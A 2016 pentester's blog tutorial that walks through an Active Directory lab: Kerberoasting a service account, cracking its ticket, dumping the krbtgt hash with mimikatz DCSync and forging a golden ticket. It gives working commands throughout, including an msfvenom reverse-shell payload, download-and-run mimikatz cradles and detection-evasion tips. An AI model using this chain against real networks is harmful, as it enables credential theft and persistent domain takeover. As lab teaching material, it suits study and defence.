+++
categories = ['active directory', 'kerberos', 'golden ticket']
date = "2016-01-09T10:12:09+02:00"
description = ""
keywords = ['kerberos', 'golden ticket', 'kerberoast', 'rc4']
title = "kerberos, kerberoast and golden tickets"
+++

{{< figure src="/images/kerberos_golden_ticket_active_directory_logo.png" >}}

Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?

The reality is, *many* times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of `lsass` and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to [automate](https://github.com/sensepost/autoDANE) this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!

This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!
<!--more-->

## lets set the scene
Kerberos, a network authentication protocol that works off a ticketing type system is deeply baked into AD. Of late, a lot more focus has been put on it by the offensive security community as you will see later in this post. I am not going to go into much (if any) of the technicalities of Kerberos itself as I feel there really is more than enough resources out there you can refer to! The below list references some great posts about the same topic I am writing about there:

- [https://en.wikipedia.org/wiki/Kerberos_(protocol)](https://en.wikipedia.org/wiki/Kerberos_(protocol\))
- [https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx](https://technet.microsoft.com/en-us/library/cc772815(v=ws.10\).aspx)
- [http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/](http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/)
- [https://adsecurity.org/?p=2362](https://adsecurity.org/?p=2362)

For all of the attacks detailed here, I have a relatively simple setup in a lab. One (Server 2012) Domain Controller for the *foo.local* domain. Two client PCs joined to the domain running Windows 7 and Windows 10. Another IIS Web server running on Server 2012 Core also joined to the domain and Kali Linux 'attacker' on the same subnet as all of these Windows computers.

One key piece of the puzzle I am leaving out is how the initial shell was obtained. This could have happened a variety of ways and will probably always be different with every engagement. Lets just assume that I have a meterpreter shell as a non privileged domain user on the Windows 10 client PC.

{{< figure src="/images/kerberos_golden_ticket_initial_meterpreter.png" >}}

One last bit of scene setting I think is important is to state the fact that we are going to try and be as quiet as possible now that we have the meterpreter shell up.

# spn scanning - the setup
One of the avenues we can pursue now is to query Active Directory for objects that have a [Service Principal Name](https://msdn.microsoft.com/en-us/library/windows/desktop/ms677949(v=vs.85\).aspx) set.

> A service principal name (SPN) is the name by which a client uniquely identifies an instance of a service. If you install multiple instances of a service on computers throughout a forest, each instance must have its own SPN.

Basically, what this means is that someone went and configured a SPN for a service account that is used by multiple by instances of a service. Each of the client PC's in my lab are running an instance of [SQL Server 2014 Express](https://www.microsoft.com/en/server-cloud/products/sql-server-editions/sql-server-express.aspx), configured to run with the `svcSQLServ` domain service account.

> When a client wants to connect to a service, it locates an instance of the service, composes an SPN for that instance, connects to the service, and presents the SPN for the service to authenticate.

On my domain controller, I configured the SPN's with the following commands:

``` html
PS C:\> setspn -A svcSQLServ/pc1.foo.local:1433 foo\svcSQLServ
Checking domain DC=foo,DC=local

Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,DC=local
        svcSQLServ/pc1.foo.local:1433
Updated object

PS C:\> setspn -A svcSQLServ/pc2.foo.local:1433 foo\svcSQLServ
Checking domain DC=foo,DC=local

Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,DC=local
        svcSQLServ/pc2.foo.local:1433
Updated object
```

## spn scanning - the offensive perspective
Right, with the configuration done, lets put on our offensive hats and try and abuse this. I think one thing that one should realize is that this is a very nice way to get a _free port scan_ done too. You will see in a moment. =]

Reading some posts and stuff online, I have found a PowerShell module that will prep the LDAP lookup and scan for SPNs for you [here](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts). The gist of it is this LDAP search `(&(objectcategory=user)(serviceprincipalname=*))`.

To use the powershell module, the easiest will be to get an interactive powershell session up and running. If you have ever tried this from meterpreter, you will know that if you try and spawn `powershell.exe` from a cmd shell, you will not get anywhere. Very frustrating. Its not impossible though! We are however going to go through the efforts of getting a working PowerShell session up as we will be using it extensively throughout this post.

### setup a powershell connection
We can use the meterpreter session to get a powershell session. First, we will create a payload to execute as a script using the `exec_powershell` post module. In a new terminal, run `msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.138.150 LPORT=4445 -t raw`:

```bash
root@kali:~# msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.138.150 LPORT=4445 -t raw
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1727 bytes
���`��1�d�P0�R
�8�u�}�;}$u�X�X$�f�Y ӋI�:I�4��1����
                      K�XӋ�ЉD$$[[aYZQ��__Z���]j���Ph1�o��ջ���Vh������<|
���u�GrojS��powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $($s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIABX0kF ... snip ... AAA='));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();)
```

This will give you the raw payload you need to run to get a remote powershell shell. Copy the output from `IEX` all the way to `ReadToEnd();)` and paste that in a new file (I used `/root/power-shell.ps1`).

Now, back at your metasploit session, background the meterpreter session and setup a new `exploit/multi/handler` for the `windows/powershell_reverse_tcp` payload. When you issue the `exploit` command, add `-j` so that the job will run in the background. We have one more thing to do before it will connect back.

{{< figure src="/images/kerberos_golden_ticket_powershell_handler.png" >}}

Fantastic. We are ready to accept the powershell connection! The last thing left to do is to execute the script we generated earlier with `msfvenom`! Use the `exec_powershell` post module and configure it to pickup the script where ever you placed it on disk:

{{< figure src="/images/kerberos_golden_ticket_exec_powershell.png" >}}

With the module configured to use the meterpreter session we originally got, as well as our exploit handler waiting in the background for the powershell connection, we can `run` this module and hope it works!

{{< figure src="/images/kerberos_golden_ticket_powershell_shell.png" >}}

> Powershell session session 3 opened

Ok, that was a lot of work, but now we have the environment we need to get in with the SPN scanning! Simply interact with the session that spawned.

The next thing we want to do is get the `Find-PSServiceAccounts` PowerShell function into the environment. The script lives [here](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts). Thankfully, we can kind of _include_ functions into the current session by using the powershell `Invoke-Expression` cmdlet. To do that we run:

```
Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts')
```

Thats it. We can now just run the method!!

{{< figure src="/images/kerberos_golden_ticket_find_psserviceaccounts.png" >}}

We have just discovered the service account `svcSQLServ` and 2 hosts there it is in use!
The script also accepts a few arguments, such as `-DumpSPN`:

```
PS C:\> Find-PSServiceAccounts -DumpSPN
Discovering service account SPNs in the AD Domain foo.local
svcSQLServ/pc1.foo.local:1433
svcSQLServ/pc2.foo.local:1433
PS C:\Users\bobs\Downloads>
```

This is the part where I remind you about the *free port scan* I mentioned earlier. Notice how we have discovered services, ports and accounts running them using just an LDAP query. Highly doubt that will trigger many monitoring tools out there!

## kerberos service tickets
We now have 2 SPN's that we managed to query off the domain. `svcSQLServ/pc1.foo.local:1433` & `svcSQLServ/pc2.foo.local:1433`. In order for clients to be able to authenticate to the services running as this user via kerberos, they would typically go through the process of requesting a service ticket.

*This is where you need to pay attention.* The service ticket is encrypted using the secret key (_read, 'password'_) of the account used in the SPN (`svcSQLServ` in this case)! The server never checks if the ticket ever went through the entire process of actually being used, it just happily generates them for whoever asks... Note, the server hosting the service will still validate the ticket itself (99% without rechecking with the Kerberos server btw).

What does that mean for an attacker? Well, we can request the service ticket... and... attempt to decrypt it by brute forcing it offline! If the decryption is successful, then we have successfully compromised a service account.

## enter kerberoast
[Kerberoast](https://github.com/nidem/kerberoast) is a tool that can amongst other things, crack Kerberos ticket passwords. The general idea is that we get the SPN's (like we did), request kerberos service tickets for them, dump the ticket out of memory and send it to the `tgsrepcrack.py` script to crack against a wordlist.

All of this can be done as a normal domain user and does not require any elevated privileges. To assist us in dumping kerberos tickets out of memory, we are going to load mimikatz by using `Invoke-Mimikatz` (from the [PowerSploit Repository](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)). This method has a very small to no chance of getting detected by AV atm. Lets get that loaded:

```
PS C:\> Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
PS C:\> Invoke-Mimikatz

  .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Dec 14 2015 19:16:34)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 17 modules * * */


mimikatz(powershell) # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

mimikatz(powershell) # exit
Bye!
```

Just running `Invoke-Mimikatz` might not be entirely opsec safe as, by default, it will run the `sekurlsa::logonpasswords` command (which may trigger some monitoring). You may have also noticed the `LOAD_MODULES` setting in the `windows/powershell_reverse_tcp` payload. Here we can actually give it the URL's we are going to load with `Invoke-Expression` and metasploit will download and prep that for you! :)

Anyways, lets check the current cached kerberos tickets that we have for this session.

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::list"'

  .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Dec 14 2015 19:16:34)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 17 modules * * */


mimikatz(powershell) # kerberos::list

PS C:\>
```

Looks like there are no cached Kerberos tickets for this session. This can also be checking by running the `klist` command:

```
PS C:\> klist

Current LogonId is 0:0x3fde2

Cached Tickets: (0)
PS C:\>
```

If you had tickets here, you can purge them from memory by running `Invoke-Mimikatz -Command '"kerberos::purge"'`.
Lets request a service ticket for the `svcSQLServ/pc1.foo.local:1433` SPN (The command syntax can be seen in the Kerberoast repository):

```
PS C:\> Add-Type -AssemblyName System.IdentityModel
PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "svcSQLServ/pc1.foo.local:1433"


Id                   : uuid-33208c1c-6f30-441f-af50-94ba72a2ed7b-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 1/9/2016 7:29:11 PM
ValidTo              : 1/10/2016 5:29:11 AM
ServicePrincipalName : svcSQLServ/pc1.foo.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey



PS C:\>
```

If you wanted to tickets for all the possible SPN's, we could have run the below that will loop over the results from `Find-PSServiceAccounts` and request a ticket for each:

```
PS C:\> Add-Type -AssemblyName System.IdentityModel
PS C:\> Find-PSServiceAccounts -DumpSPNs | ForEach-Object { New-Object System.Identity Model.Tokens.KerberosRequestorSecurityToken -ArgumentList $_ }

```

Now, if we recheck the tickets we have for this session, we can see that we have one for `svcSQLServ`:

{{< figure src="/images/kerberos_golden_ticket_spn.png" >}}

## dumping kerberos tickets from memory
Remember, all of the actions performed thus far have been as a normal AD user with no special privileges. With the tickets now in memory, we can dump them to a file using mimikatz again:

{{< figure src="/images/kerberos_golden_ticket_exported_tickets.png" >}}

`1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi` is the Kerberos ticket dumped to disk! We can now transfer this to some place where we have Kerberoast downloaded and start cracking it! :D

## cracking the kerberos ticket
Back at my meterpreter session, we can simply download the ticket locally, and start the crack. `tgsrepcrack.py` allows you to specify tickets with a wildcard, so it will run the wordlist recursively over all of the tickets in a directory.

So download the ticket...
``` html
meterpreter > cd downloads/kerb
meterpreter > ls
Listing: C:\users\bobs\downloads\kerb
=====================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  1260  fil   2016-01-09 14:35:09 -0500  0-40e10000-bobs@krbtgt~FOO.LOCAL-FOO.LOCAL.kirbi
100666/rw-rw-rw-  1364  fil   2016-01-09 14:35:09 -0500  1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi

meterpreter > download Interrupt: use the 'exit' command to quit
meterpreter > download 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi /root/
[*] downloading: 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi -> /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
[*] download   : 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi -> /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
```

... and crack it!

``` html
root@kali:~/kerberoast# python tgsrepcrack.py /usr/share/wordlists/fasttrack.txt /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
found password for ticket 0: Password1  File: /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
All tickets cracked!
```

`Password1` is the password for the `svcSQLServ` account! \o/

One reason why having the password for this account is especially bad is because of its group memberships... Yes, I know. You may not easily see this in real life, but just bear with me for now.

``` html
PS C:\> net user svcSQLServ /domain
The request will be processed at a domain controller for domain foo.local.

User name                    svcSQLServ
Full Name                    SQL Server
Comment                      SQL Server Serice Account
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/7/2016 11:38:02 PM
Password expires             Never
Password changeable          1/8/2016 11:38:02 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/9/2016 10:33:41 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.

PS C:\>
```

## testing the credentials
For a bit of fun, lets test the credentials we just got using PowerShell Remoting. PowerShell Remoting is on by default on Server 2012 I believe.

We will start by configuring a credentials object, and then just run the `Get-Process` cmdlet on the domain controller as proof.

``` html
$pass = 'Password1' | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList 'svcSQLServ', $pass
Invoke-Command -ScriptBlock {get-process} -ComputerName dc1 -Credential $creds
```

With output...

{{< figure src="/images/kerberos_golden_ticket_svcsqlserv_remoting.png" >}}

So, we popped a service account with waaaay too much permissions and a crappy password. All that as a normal AD user...

# golden tickets
We have domain administrative rights now. There is nothing left to do, we can write the pentest report and go home. Or can we? Well yes, but what if the password to `svcSQLServ` changes? That would mean we lose access! One way we can prevent this is by creating a _golden ticket_ that we can re-use to grant ourselves whatever permission we like, as any user we like! Sounds great eh :D

To create a golden ticket, we can use either the *kiwi* extension in metasploit, or `Invoke-Mimikatz` again! There are a few prerequisites that we need to satisfy for golden tickets. The most important being that we need at least the NT hash of the `krbtgt` user of the domain. Without that, this is not a viable persistence strategy.

The complete list of prerequisites are:
- The Domains FQDN
- The Domains SID
- The `krbtgt` accounts NT hash
- A username (fake or real, does not matter. Not fake if you need opsec ofc!)

Getting the FQDN and SID (`whoami /user`) of the Domain should be relatively trivial. Remember to grab the SID without the [trailing RID](https://en.wikipedia.org/wiki/Security_Identifier). So if the full SID is `S-1-5-21-2222611480-1876485831-1594900117-1104` then you are only going to use `S-1-5-21-2222611480-1876485831-1594900117`.

Getting the NT Hash of the `krbtgt` account though is something I want to show using a recent feature addition to mimikatz, [DCSync](http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/). The gist of it is that its possible to extract hashes from a Domain Controller (using a domain admin type account), without actually running any code on the Domain Controller itself! This is of course not the only way to get the required hash. Many of the older techniques work just fine. That means hash extraction from any PC on the domain (authenticated as a admin), but ‘faking’ being a Domain Controller and triggering some replication-fu! In my case, I struggled a little to get this replication done from a client PC in the lab via the metasploit interactive PowerShell session, but could do it successfully from a client PC via the console. So, its definitely possible!

In this case, to use the DCSync feature of mimikatz, I am going to use PowerShell Remoting to run commands. Unfortunately, due to the way `Enter-PSSession` sets up the shell, I can't seem to get an interactive shell as another user via metasploit going without using another exploit && payload combination. So, we are just going to use `Invoke-Command` with our commands.

``` html
PS C:\> $creds

UserName                       Password
--------                       --------
svcSQLServ System.Security.SecureString


PS C:\> Invoke-Command -ScriptBlock {Write-Output $env:username} -Credential $creds -ComputerName dc1
svcSQLServ
```

Great so that works. To continue, we are going to have to run a few commands.
- `Invoke-Expression` to get mimikatz
- Run `Invoke-Mimikatz` with `lsadump::dcsync /user:krbtgt` and its required parameters
- Dance!

I constructed my command that needed to be run on my PowerShell session and ended up with this:

```
Invoke-Command -ScriptBlock {Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'} -Credential $creds -ComputerName dc1
```

Let me try explain what is going on here. I am saying, `Invoke-Command` on the computer `dc1` as `svcSQLServ` (stored in the `$creds` variable) using PowerShell Remoting. The command to run is defined in the `ScriptBlock {}` which is; download mimikatz; run `Invoke-Mimikatz` with the `lsadump::dcsync /user:krbtgt` command.

{{< figure src="/images/kerberos_golden_ticket_krbtgt.png" >}}

We have the hash for `krbtgt`! `95a11f7d93fa3a5a61073662e6bd8468` : D That means I have everything I need to create a golden ticket, with all the access in the world! To summarize, my prerequisites are satisfied with the following values:

- The Domains FQDN. `foo.local`
- The Domains SID. `S-1-5-21-2222611480-1876485831-1594900117`
- The `krbtgt` accounts NT hash. `95a11f7d93fa3a5a61073662e6bd8468`
- A username (fake or real, does not matter. Not fake if you need opsec ofc!). `darthvader`

## creating the golden ticket
Creating the golden ticket is now a really simple task. We will simply call `Invoke-Mimikatz` again to generate the ticket. It will be saved to disk when it is generated. Thereafter, we will purge all the tickets we have for the session, and inject the golden ticket and test our access!

For details about the command and arguments required, I referred to the [mimikatz wiki](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver) and replicated that. Our command should look something like the below, saving our golden ticket to `golden.tck`:

``` html
kerberos::golden /user:darthvader /domain:foo.local /sid:S-1-5-21-2222611480-1876485831-1594900117 /krbtgt:95a11f7d93fa3a5a61073662e6bd8468 /ticket:golden.tck /groups:501,502,513,512,520,518,519
```

Running this mimikatz command with `Invoke-Mimikatz` gets us our Golden Ticket:

{{< figure src="/images/kerberos_golden_ticket_created.png" >}}

## injecting the golden ticket
The final test is to *use* this ticket. For that, we will purge all Kerberos tickets in memory and inject the new golden ticket. Thereafter we will test if we can read the administrative `c$` share of the Domain Controller!

Lets purge the currently cached Kerberos tickets first:

``` html
PS C:\users\bobs\downloads\golden> Invoke-Mimikatz -Command '"kerberos::purge"'

[... snip ...]

mimikatz(powershell) # kerberos::purge
Ticket(s) purge for current session is OK
```

Next, we inject the golden ticket we created using the mimikatz `kerberos::ptt` command to _'Pass The Ticket'_:

{{< figure src="/images/kerberos_golden_ticket_ptt.png" >}}

After the ticket is injected into memory, we can verify its existence with the mimikaz `kerberos::list` command, or just using `klist`. Once it is injected, we `dir` the Domain Controllers `c$` share... an *smile*. The password for `scvSQLServ` can now change, it will no longer bother us!

{{< figure src="/images/kerberos_golden_ticket_admin.png" >}}

## conclusion
In this post we saw how it is possible to 'crack' badly passworded and configured service accounts by querying for accounts by Service Principal Names. Those SPN's were then used to request Service Tickets from the Domain Controller, extracted from memory and cracked offline. All of that as a normal domain user.

Then, we explored how it is possible to extract Domain Account hashes using the mimikatz _DCSync_ feature and generate a Kerberos Golden Ticket with high access levels in the domain.

I think there is still a loooong road ahead for the Microsoft Kerberos Implementations... Until they 'fix' this stuff, things should remain interesting for quite some time to come.
